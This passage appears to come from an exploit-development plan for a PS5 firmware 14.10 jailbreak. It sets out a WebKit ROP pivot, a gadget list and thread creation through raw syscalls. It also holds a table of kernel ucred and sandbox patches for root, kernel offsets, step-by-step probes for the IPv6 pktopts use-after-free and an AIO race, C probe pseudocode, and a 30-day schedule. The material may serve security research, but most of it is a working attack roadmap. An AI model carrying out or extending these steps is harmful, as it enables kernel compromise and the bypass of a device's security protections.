**(c) Run arbitrary native code.** Once a page is executable, write a position-independent
payload via kernel R/W (or via the write alias), then hijack a WebKit C++ vtable/function pointer
to jump to it, or `ret` into it from the ROP chain. The userland ROP stack is already in an
ArrayBuffer; the same pivot can land in the new page. Clean up the vtable and the `vm_map_entry`
afterward if you want the tab to survive.

**Minimum chain in one sentence:** the kernel R/W primitive is ~6 syscalls; root is an `allproc`
walk and a `ucred` write; native code is one of jitshm, a `vm_map_entry` protection write, or
nothing. The syscall filter patch is optional for root and irrelevant to the exec-bit refusal.

---

## 5. ROP and threading design

### 5.1 What the WebKit side must provide

1. A stack pivot from a controlled C++ object (vtable/function pointer) to a ROP stack in an
   ArrayBuffer. The Canvas chain's final stage is already "vtable hijack → ROP"; reuse it.
2. `BigUint64Array` for pointer writes; no float64 channels (DAZ is on).
3. A 14.10 `libSceNKWebKit` gadget map with at least: `pop rdi; ret`, `pop rsi; ret`,
   `pop rdx; ret`, `pop rcx; ret`, `pop rax; ret`, `pop rsp; ret`, `mov [rdi], rsi; ret`,
   `ret`. The 13.60 map is the pattern; the 14.10 addresses differ.
4. A syscall trampoline: `libkernel` `getpid` + `0xa`, or the 14.10 `syscall_map` offsets from
   `refs/ipso_exploit.js` re-derived. Prefer `getpid+0xa`: it survives wrapper reordering.

### 5.2 Threads

The IPv6 race needs two native loops; the AIO race needs three. Options:

- **`pthread_create_name_np`** (libkernel; 13.60 offset `0x21890`) with a start routine that is a
  ROP chain. This is what the 3.xx `thread_rop` does; it is the most portable.
- **`thr_new(455)`** with `struct thr_param` (`start_func +0`, `arg +8`, `stack_base +0x10`,
  `stack_size +0x18`, `child_tid +0x30`) — simpler than 430, per the 14.10 live probes.
- **`thr_create(430)`** with the ucontext gates: `+0x108 = 0x480`, `+0x0d0 <= 7`,
  `+0x110 = 0x10000`, `CS=0x43`, `SS=0x3b`, GPRs at `+0x048..`, RIP `+0x0e0`, RSP `+0x0f8`.
  Use this if `pthread_create` is not reachable; the gates are measured on 14.10.

A child thread without TLS crashes on the first failing syscall (`%fs:0`); prepend
`sysarch(SET_FSBASE=129, &fake_tcb)` or use a chain that never fails. External 14.10 research
documents this in `THREADING_ALIVE_14_10.md`.

### 5.3 The kernel data patches

| Patch | Address (14.10) | Value | Purpose |
|---|---|---|---|
| `ucred.cr_uid` | `ucred+0x04` | 0 | root |
| `cr_ruid` / `cr_svuid` | `+0x08` / `+0x0C` | 0 | root |
| `cr_ngroups` | `+0x10` | 1 | group fix |
| `cr_rgid` / `cr_svgid` | `+0x14` / `+0x18` | 0 | group fix |
| `cr_sceAuthId` | `+0x58` | `0x4800000000000007` | system auth id |
| `cr_sceCaps` / `cr_sceCaps1` | `+0x60` / `+0x68` | `0xffffffffffffffff` | caps |
| `cr_sceAttrs` | `+0x80` | keep high 32, set `0x80000000` | attrs |
| `p_dynlib.syscallStart` | `dynlib+0xF0` | 0 | filter |
| `p_dynlib.syscallEnd` | `+0xF8` | `0xffffffff` | filter |
| `p_dynlib.restrictFlags` | `+0x118` | 0 | sandbox flags |
| `p_dynlib.libkernelRef` | `+0x18` | 1 | ref |
| `vm_map_entry.protection` | `entry+0x64` | `0x7` | exec page |

The `ucred` offsets are confirmed by the SDK v0.45 14.10 table and the 13.60 Relapse code. The
`p_dynlib` offset 0x3E8 is confirmed by the SDK (three uses in `crt/kernel.c`). The `dynlib` field
offsets are 13.60 and need a 14.10 cross-check; the SDK's `dynlib_obj_t` has `sysvec` at 0x10 and
the `unknown2[7]` region around 0xE8, consistent with 0xF0/0xF8.

### 5.4 The 14.10 offset table you actually have

From `ps5-payload-sdk` v0.45 (`crt/kernel.c`, cases `0x14000000`/`0x14100000`):

```
TEXT_BASE   = DATA_BASE - 0x0CE0000
ALLPROC     = DATA_BASE + 0x28D9EA0
ROOTVNODE   = DATA_BASE + 0x315B510
SECURITY_FLAGS = DATA_BASE + 0x0DA4064
BUS_DATA_DEVICES = DATA_BASE + 0x20A8878
VMSPACE_P_ROOT = 0x1D0
VMSPACE_VM_PMAP = 0x2E8
PROC_P_UCRED = 0x40, PROC_P_FD = 0x48, PROC_P_PID = 0xBC, PROC_P_VMSPACE = 0x200
UCRED_CR_UID = 0x04, RUID 0x08, SVUID 0x0C, RGID 0x14, SVGID 0x18
UCRED_CR_PRISON = 0x30, SCEAUTHID 0x58, SCECAPS 0x60, SCEATTRS 0x80
```

These are **data-base relative**. They do not give you the data base; that is the KASLR leak.
The SDK's `kernel_init` takes `kdata_base_addr` from the exploit for exactly this reason.

---

## 6. The gates, in order

### Gate 1 — kernel identity (30 min)

Call `__xuname(256, buf)` (165). Read `release` at `+0x200` and `version` at `+0x300`.
`kern.osreldate` via sysctl 202/[1,1] is the tie-breaker. Record: release string, version string,
osreldate, page size (`getpagesize` or a `mmap` query), and whether the `ip6_pcbopts` symbol is
present in any 14.10 kernel image you hold.

**Decision:** `14.1` → Scenario B, go to Gate 3 (AIO). `11.0/r230171` → Scenario A, go to Gate 2
(IPv6).

### Gate 2 — IPv6 option 25 and overlap (2–3 h)

1. `socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP)`; expect fd > 0.
2. Build the `IPV6_TCLASS` cmsg (0x18 bytes) and call
   `setsockopt(fd, 41, 25, cmsg, 0x18)`. Expect **0**. If it returns `ENOPROTOOPT`/`EINVAL` even
   with a valid cmsg, option 25 is filtered/stubbed: stop.
3. Call `setsockopt(fd, 41, 61, &tag, 4)` and `getsockopt(fd, 41, 61, &val, &len)`. Expect the
   tag; if not, the pktopts path is not behaving.
4. Run the two-thread race for 10k iterations with 400 spray sockets and TCLASS tag checks.
   Success = one spray socket returns the master tag. No success after 10k ≈ stop (or the race
   window is too narrow without `cpuset`/`rtprio`).
5. If overlap: run `fake_pktopts` and the `IPV6_PKTINFO` read of a known kernel pointer
   (`kqueue_addr` from the leak). If the read returns the expected value, the primitive is live.
6. If the kernel is 14.1 and step 2 succeeds, do **not** assume the race is live: the 14.1 code
   has the `INP_WLOCK` fix. The race will not overlap; stop after step 4.

### Gate 3 — AIO lifecycle and race (1 day)

Run the 9-step probe in §2.1. Then the 3-thread race with a 128-id batch, 1k iterations, and a
canary. Success = a corrupted request state, a controlled reclaim, or a kernel pointer; a crash is
not success, it is a data point. If no anomaly after 10k iterations, the private bug needs a
different lifecycle (e.g., `aio_multi_wait` vs `aio_multi_delete`, or a specific state/waiter
combination); go back to the 13.60 handler decode and enumerate the state machine before writing
more spray code.

---

## 7. 30-day execution plan (assuming IPv6 is live)

| Days | Work | Exit criteria |
|---|---|---|
| 1–2 | Gate 1 + Gate 2; resolve the 14.10 gadget map and `getpid+0xa`; build a native thread harness | `__xuname` says 11 fork; option 25 returns 0; a `setsockopt` syscall fires from a ROP thread |
| 3–7 | Port stage 1 (UAF/overlap) from `refs/ipso_exploit.js`; tune spray count/pinning | One overlap within 10k iterations; no panic |
| 8–12 | Port stage 2/3 (fake pktopts, kqueue leak, data-base derivation) | Read a known kernel pointer; data base matches `allproc`/`rootvnode` |
| 13–17 | Stage 5: `allproc` walk, `ucred`, `p_dynlib`; verify `getuid()==0` and sandbox flag | Root in WebContent; tab survives |
| 18–22 | Exec page: jitshm 533/534 test; if blocked, `vm_map_entry` patch; shellcode; jump | A marker executes from a page you made executable, or the HV test fails and you document the wall |
| 23–27 | Reliability: 20 runs, crash triage, cleanup (sockets, kqueue, vtable, vm_map) | ≥70% success; no console reboot on the happy path |
| 28–30 | Write-up, offsets file, probe archive | A repeatable chain and a 14.10 offset table |

If Gate 1 says 14.1, replace days 3–12 with the AIO race and add a KASLR-leak spike (5–10 days);
the plan becomes 6–8 weeks, not 30 days.

---

## 8. Risks and what would change the answer

| Risk | Impact | Mitigation |
|---|---|---|
| Kernel is 14.1, not r230171 | IPv6/5596 dead; aio only | Gate 1; do not port IPv6 until it passes |
| Sony backported SA-20:20 into the 11 fork | IPv6 race never overlaps | Gate 2 step 4; if no overlap in 10k, stop |
| Option 25 filtered in WebContent | IPv6 dead even on 11 fork | Gate 2 step 2; fall back to aio |
| No 14.10 `libSceNKWebKit` gadget map | ROP chain cannot be built | Obtain the 14.10 module image; re-derive `wk_gadgetmap`; or use `getpid+0xa` + libkernel gadgets |
| No kernel KASLR leak | aio path stalls at "kernel R/W but no addresses" | Prioritize the kqueue leak (IPv6) or a new 14.10 leak; the SDK offsets are relative |
| jitshm blocked and `vm_map_entry` patch fails | No native code; pure ROP only | Test the `vm_map_entry` patch early; document the HV wall and stop chasing exec |
| AIO race panics the console | Lost time, possible corruption | Disposable console; one iteration per boot; canary; no hostile pointers |
| WebContent fd limit | 400 sockets + 100 kqueues may not fit | Tune spray counts; use `getrlimit(RLIMIT_NOFILE)` and raise it if allowed |
| kqueue/pipe filtered in WebContent | IPv6 leak and full R/W path fail | Test kqueue 362/363 and pipe2 687 from WebContent before the race |

**What would change the ranking**

- A 14.10 kernel dump showing `ip6_pcbopts` **without** `INP_WLOCK` and with `M_WAITOK`: IPv6
  becomes #1 even if `uname` says something odd.
- A 14.10 kernel dump showing `INP_WLOCK`: IPv6 is dead; aio is #1.
- A working 14.10 `jitshm_create`: the exec-page problem disappears; both paths become viable.
- A 14.10 KASLR leak that works from WebContent: the aio path's biggest cost drops.
- A public 14.10 AIO delete write-up/PoC (like Relapse for 13.60): aio becomes the fastest.

---

## Appendix A — IPv6 probe pseudocode

```c
// All syscall numbers are PS5 14.10; args are 64-bit.
int s = sys(97, 28 /*AF_INET6*/, 2 /*SOCK_DGRAM*/, 17 /*IPPROTO_UDP*/);
char cmsg[0x18] = {0};
*(u64*)(cmsg+0x00) = 0x14;          // cmsg_len = CMSG_LEN(4)
*(u32*)(cmsg+0x04) = 41;            // IPPROTO_IPV6
*(u32*)(cmsg+0x08) = 61;            // IPV6_TCLASS
*(u32*)(cmsg+0x10) = 0;

long r = sys(105, s, 41, 25 /*IPV6_2292PKTOPTIONS*/, cmsg, 0x18);
// expect 0. If -1 with errno ENOPROTOOPT/EINVAL, option 25 is not usable.

int tag = 0x13370001, val = 0; socklen_t len = 4;
sys(105, s, 41, 61, &tag, 4);
sys(118, s, 41, 61, &val, &len);
// expect val == tag.
```

The two-thread race and the fake pktopts are in `refs/ipso_exploit.js` lines 890–1115; the
`struct ip6_pktopts` offsets are +0x10/+0x70/+0xC0 (size 0xD0).

## Appendix B — AIO probe pseudocode

```c
sys(416, 12 /*SIGSYS*/, &(struct sigaction){.sa_handler=SIG_IGN}, 0); // ignore SIGSYS
sys(670, 0, 0, 0, 0);                       // aio_init
int sv[2]; sys(135, 1 /*AF_UNIX*/, 1 /*SOCK_STREAM*/, 0, sv);
struct req { s64 off; u64 len; void *data; u64 *res; int fd; int pad; } r =
    {0, 16, buf, &res, sv[0], 0};
u32 id = 0;
sys(669, 1 /*read*/, &r, 1, 1, &id);        // expect 0, id != 0
u32 st = 0;
for (int i=0;i<200 && st!=3;i++) sys(664, &id, 1, &st, 0);
u32 delres = 0;
sys(662, &id, 1, &delres);                  // expect 0, delres 0
// duplicate-delete [id,id]: first 0, second 0x80020003
```

The 3-thread race: `662` on a 128-id batch, `663`/`666` on the same id, `669` spray. Pin threads,
canary with `getpid`, stop on the first unexpected kill.

## Appendix C — References

- FreeBSD-SA-20:20.ipv6 (CVE-2020-7457): https://security.FreeBSD.org/advisories/FreeBSD-SA-20:20.ipv6.asc
- Metasploit module + theflow0 C exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/freebsd/local/ip6_setpktopt_uaf_priv_esc.rb
- PS5 IPv6 WebKit-ROP port: https://github.com/Cryptogenic/PS5-IPV6-Kernel-Exploit (local `.tmp/ps5ipv6`, `refs/ipso_exploit.js`)
- FreeBSD-SA-19:02.fd (CVE-2019-5596): https://security.FreeBSD.org/advisories/FreeBSD-SA-19:02.fd.asc
- `ps5-payload-sdk` v0.45, 14.00/14.10 offsets: https://github.com/ps5-payload-dev/sdk (local `.tmp/sdk`, commit `a7685ce`)
- External 14.10 live evidence: AIO_14_10_LIVE, AIO_BATCH_14_10, AIO_FAMILY_13_60_DECODE, THREADING_ALIVE_14_10, MSYNC_CVE_2026_49418, ATTACK_SURFACE, DEAD_ENDS
- Local 13.60 AIO exploit: `refs/relapse_exploit.js`, `offsets/13.60.js`
